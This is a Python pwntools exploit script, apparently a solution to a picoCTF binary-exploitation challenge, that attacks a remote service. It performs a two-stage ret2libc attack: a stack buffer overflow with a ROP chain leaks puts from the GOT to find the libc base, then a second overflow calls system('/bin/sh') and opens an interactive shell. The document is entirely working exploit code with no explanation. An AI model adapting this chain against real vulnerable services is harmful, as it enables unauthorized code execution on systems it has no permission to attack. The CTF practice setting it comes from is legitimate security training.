#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
ld = ELF("ld-2.27.so", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process(exe.path)
else:
    p = remote("mercury.picoctf.net", 42072)

pop_rdi = 0x400913
write_section = 0x601400
ret = 0x4006d7

#stage 1 leak libc
p.recvline()
input()
payload = b'a'*0x88
payload += p64(pop_rdi) + p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym['main'])
p.sendline(payload)
p.recvline()
libc_leak = u64(p.recvline()[:-1].ljust(8, b'\0'))
libc.address = libc_leak - 0x80a30
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))
log.info("system: " + hex(libc.sym.system))
log.info("/bin/sh: " + hex(libc.address + 0x1b40fa))

#stage 2 overwrite rip -> system
p.recvline()
payload = b'a'*0x88
payload += p64(pop_rdi)
payload += p64(libc.address + 0x1b40fa)
payload += p64(ret)
payload += p64(libc.sym.system)
p.sendline(payload)

p.interactive()